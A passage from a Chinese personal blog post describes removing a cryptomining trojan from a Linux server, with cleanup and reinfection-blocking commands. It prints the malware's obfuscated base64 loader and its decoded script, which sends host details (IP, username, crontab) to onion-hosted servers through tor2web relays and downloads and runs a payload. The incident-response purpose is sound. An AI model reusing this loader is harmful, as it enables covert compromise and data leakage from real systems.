+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/systemd-service.sh</span><br></pre></td></tr></table></figure>
+
+<p>好吧，又是一个<code>base64</code>编码之后的东西，看起来，套路都一样呢？惊得我直呼一声好家伙</p>
+<p><img src="/posts/e2d5f670/2021-03-28-22-10-18.png" alt></p>
+<p>源文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">echo nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV</span><br><span class="line">echo blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash</span><br></pre></td></tr></table></figure>
+
+<p>解码之后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfV</span><br><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line">t=$(echo &quot;wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id&quot;)</span><br><span class="line"></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)</span><br><span class="line">s=$($c https://$&#123;n[$((RANDOM%10))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &apos; &apos; &apos;\n&apos;|grep -Ev [.]0|sort -uR|head -n 1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fexe() &#123;</span><br><span class="line">for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/int.$(uname -m)</span><br><span class="line">x=./$(date|md5sum|cut -f1 -d-)</span><br><span class="line">r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &apos;inet &apos;|awk &#123;&apos;print $2&apos;&#125;|md5sum|awk &#123;&apos;print $1&apos;&#125;)_$(crontab -l|base64 -w0)</span><br><span class="line">$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$r</span><br><span class="line">chmod +x $x;$x;rm -f $x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for h in tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su </span><br><span class="line">do</span><br><span class="line">if ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; then</span><br><span class="line">fexe;u $t.$h</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)</span><br><span class="line">ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)</span><br><span class="line">else</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
+
+<p>好家伙，不看不知道，一看下一跳，跟之前那个文件一模一样，吓得我又不由自主的说了一句，好家伙</p>
+<p>这里补充一点分析：之前我们只是用<code>crontab -l</code>，查看了定时任务，并没有找到定时任务的配置文件，而经验告诉我们，<code>crontab</code>的配置文件，通常在<code>/etc/cron.d/</code>下，还有，如果是<code>root</code>用户，在<code>/var/spool/cron/crontabs/root</code>文件中，于是我们分别执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -la /etc/cron.d/</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/e2d5f670/2021-03-28-22-21-48.png" alt></p>
+<p>果然，看到了熟悉的<code>0systemd-service</code></p>
+<p>我们来看一下，它的内容，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/cron.d/0systemd-service</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/e2d5f670/2021-03-28-22-23-48.png" alt></p>
+<p>可以清晰的看到，它在定时的启动挖矿程序</p>
+<p>好了，分析真的就到这里为止了，下面是解决木马篇</p>
+<h3 id="彻底干掉木马"><a href="#彻底干掉木马" class="headerlink" title="彻底干掉木马"></a>彻底干掉木马</h3><p>分析了一大堆，最关键的文件是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/cron.d/0systemd-service</span><br><span class="line">/var/spool/cron/crontabs/root</span><br><span class="line">/opt/systemd-service.sh</span><br><span class="line">/root/.systemd-service.sh</span><br></pre></td></tr></table></figure>
+
+<p>删掉这几个文件，然后停掉挖矿进程即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/.X11-unix/01 |xargs kill -9 &amp;&amp; cat /tmp/.X11-unix/11 |xargs kill -9 &amp;&amp; rm -rf /etc/cron.d/0systemd-service &amp;&amp; rm -rf /opt/systemd-service.sh &amp;&amp; rm -rf /root/.systemd-service.sh &amp;&amp; rm -rf /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<p>重启，验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot now</span><br></pre></td></tr></table></figure>
+
+<h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>根据经验，我们可以知道，挖矿木马，通常还会修改我们的<code>know_hosts</code>文件和<code>hosts</code>文件，所以我们去验证一下，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .ssh/known_hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/e2d5f670/2021-03-28-22-38-06.png" alt></p>
+<p>可以看到，果然写了一个公钥到<code>know_hosts</code>文件</p>
+<p>可以执行，<code>echo &gt; .ssh/known_hosts</code>，修复它</p>
+<p>我们在看一下<code>hosts</code>文件，执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/e2d5f670/2021-03-28-22-40-31.png" alt></p>
+<p>看起来并没有修改</p>
+<p>当然，也可以利用木马的特征，故意的制造一些混淆文件，防止再次感染，当然，也不是绝对有效的，安全与反安全，从来就没有高低之分，有的只是技术人员的能力差别而已</p>
+<p>附上防止再次感染的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/cron.d/0systemd-service &amp;&amp; chmod 000 /etc/cron.d/0systemd-service &amp;&amp; chattr -i /etc/cron.d/0systemd-service &amp;&amp;</span><br><span class="line">mkdir /opt/systemd-service.sh &amp;&amp; chmod 000 /opt/systemd-service.sh &amp;&amp; chattr -i /opt/systemd-service.sh &amp;&amp;</span><br><span class="line">mkdir /root/.systemd-service.sh &amp;&amp; chmod 000 /root/.systemd-service.sh &amp;&amp; chattr -i /root/.systemd-service.sh &amp;&amp; </span><br><span class="line">mkdir /var/spool/cron/crontabs/root &amp;&amp; chmod 000 /var/spool/cron/crontabs/root &amp;&amp; chattr -i /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<p>总结：解决挖矿木马，并防止感染，只需要两步：</p>
+<ol>
+<li> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/.X11-unix/01 |xargs kill -9 &amp;&amp; cat /tmp/.X11-unix/11 |xargs kill -9 &amp;&amp; rm -rf /etc/cron.d/0systemd-service &amp;&amp; rm -rf /opt/systemd-service.sh &amp;&amp; rm -rf /root/.systemd-service.sh &amp;&amp; rm -rf /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+</li>
+<li> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/cron.d/0systemd-service &amp;&amp; chmod 000 /etc/cron.d/0systemd-service &amp;&amp; chattr -i /etc/cron.d/0systemd-service &amp;&amp;</span><br><span class="line">mkdir /opt/systemd-service.sh &amp;&amp; chmod 000 /opt/systemd-service.sh &amp;&amp; chattr -i /opt/systemd-service.sh &amp;&amp;</span><br><span class="line">mkdir /root/.systemd-service.sh &amp;&amp; chmod 000 /root/.systemd-service.sh &amp;&amp; chattr -i /root/.systemd-service.sh &amp;&amp; </span><br><span class="line">mkdir /var/spool/cron/crontabs/root &amp;&amp; chmod 000 /var/spool/cron/crontabs/root &amp;&amp; chattr -i /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>本文完。。。看到这里，也说明你很有毅力和探索欲，如果觉得我写的还不错，请打赏支持我，毕竟创作不易，谢谢大家</p>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/posts/c417f07b/" rel="bookmark">ubantu配置安装tesseract-ocr</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/posts/7a7901bf/" rel="bookmark">nginx搭建直播服务器</a></div>
+      
+    </li>
+  
+  </ul>
+
+        
+      
+        <div id="reward-container">
+  <div>觉得不错，打赏一下</div>
+  <button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+        
+      
+      <div style="display: inline-block">
+        <img src="/images/wechatpay.png" alt="子墨 微信支付">
+        <p>微信支付</p>
+      </div>
+        
+      
+      <div style="display: inline-block">
+        <img src="/images/alipay.png" alt="子墨 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>子墨</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://blog.zimo.wiki/posts/e2d5f670/" title="记一次帮师兄解决服务器挖矿木马的过程">https://blog.zimo.wiki/posts/e2d5f670/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a style="text-align:center;" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
+            
+              <a href="/tags/挖矿木马/" rel="tag"><i class="fa fa-tag"></i> 挖矿木马</a>
+            
+              <a href="/tags/服务器/" rel="tag"><i class="fa fa-tag"></i> 服务器</a>
+            
+              <a href="/tags/运维/" rel="tag"><i class="fa fa-tag"></i> 运维</a>
+            
+          </div>
+        
+
+        
+  <div class="post-widgets">
+    <div class="social-share">
+      
+      
+        <div id="needsharebutton-postbottom">
+          <span class="btn">
+            <i class="fa fa-share-alt" aria-hidden="true"></i>
+          </span>
+        </div>
+      
+    </div>
+  
+  </div>
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/posts/39ffeca3/" rel="next" title="终端使用代理">
+                  <i class="fa fa-chevron-left"></i> 终端使用代理
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/posts/7004a632/" rel="prev" title="一份不专业的树梅派400使用指南">
+                  一份不专业的树梅派400使用指南 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    
+  <div class="comments" id="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NTk4Ni8yMjQ5Nw=="></div>
+  </div>
+  
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          
+<div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/header.jpg"
+      alt="子墨">
+  <p class="site-author-name" itemprop="name">子墨</p>
+  <div class="site-description motion-element" itemprop="description">子墨的博客</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">71</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a style="text-align:center;" href="https://github.com/ZimoLoveShuang" title="GitHub &rarr; https://github.com/ZimoLoveShuang" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a style="text-align:center;" href="mailto:461009747@qq.com" title="E-Mail &rarr; mailto:461009747@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a style="text-align:center;" href="https://blog.csdn.net/qq_36737934" title="CSDN &rarr; https://blog.csdn.net/qq_36737934" rel="noopener" target="_blank"><i class="fa fa-fw fa-stack-overflow"></i>CSDN</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a style="text-align:center;" href="tencent://Message/?Uin=461009747&websiteName=q-zone.qq.com&Menu=yes" title="QQ &rarr; tencent://Message/?Uin=461009747&websiteName=q-zone.qq.com&Menu=yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a style="text-align:center;" href="https://gitee.com/zimolove3" title="Gitee &rarr; https://gitee.com/zimolove3" rel="noopener" target="_blank"><i class="fa fa-fw fa-gitlab"></i>Gitee</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element links-of-blogroll-block">
+    <div class="links-of-blogroll-title">
+      <i class="fa  fa-fw fa-link"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.gaozhengjie.cn/" title="https://www.gaozhengjie.cn/" rel="noopener" target="_blank">高正杰的博客</a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+<div class="widget-wrap">
+    <h3 class="widget-title" style="text-align:center;">Tag Cloud</h3>
+    <div id="myCanvasContainer" class="widget tagcloud">
+        <canvas width="250" height="250" id="resCanvas" style="width=100%">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/807/">807</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HttpCanary/">HttpCanary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/">JavaScript</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jupyter-Notebook/">Jupyter Notebook</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/centos/">centos</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cuda/">cuda</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c语言/">c语言</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/deepin/">deepin</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns2tcp/">dns2tcp</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fiddler/">fiddler</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/html/">html</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/i至诚/">i至诚</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jar/">jar</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jetbrains/">jetbrains</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux-server/">linux server</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/markdown/">markdown</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/">nginx</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nodejs/">nodejs</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python3/">python3</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pytorch/">pytorch</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tesseract-ocr/">tesseract-ocr</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubantu/">ubantu</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtualenvwrapper-win/">virtualenvwrapper-win</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/war/">war</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows-server/">windows server</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/个人博客/">个人博客</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代理/">代理</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码托管/">代码托管</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码雨/">代码雨</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/伪装位置/">伪装位置</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/使用指南/">使用指南</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/刷recovery/">刷recovery</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/力扣/">力扣</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/劫持/">劫持</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/双系统/">双系统</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/小爱课程表/">小爱课程表</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/小米6/">小米6</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/常识/">常识</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/快捷键冲突/">快捷键冲突</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/抓包/">抓包</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/折腾/">折腾</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/挖矿木马/">挖矿木马</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/服务器/">服务器</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/机器学习/">机器学习</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/极客/">极客</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/树梅派400/">树梅派400</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/油猴脚本/">油猴脚本</a><span class="tag-list-count">1</span></li><li 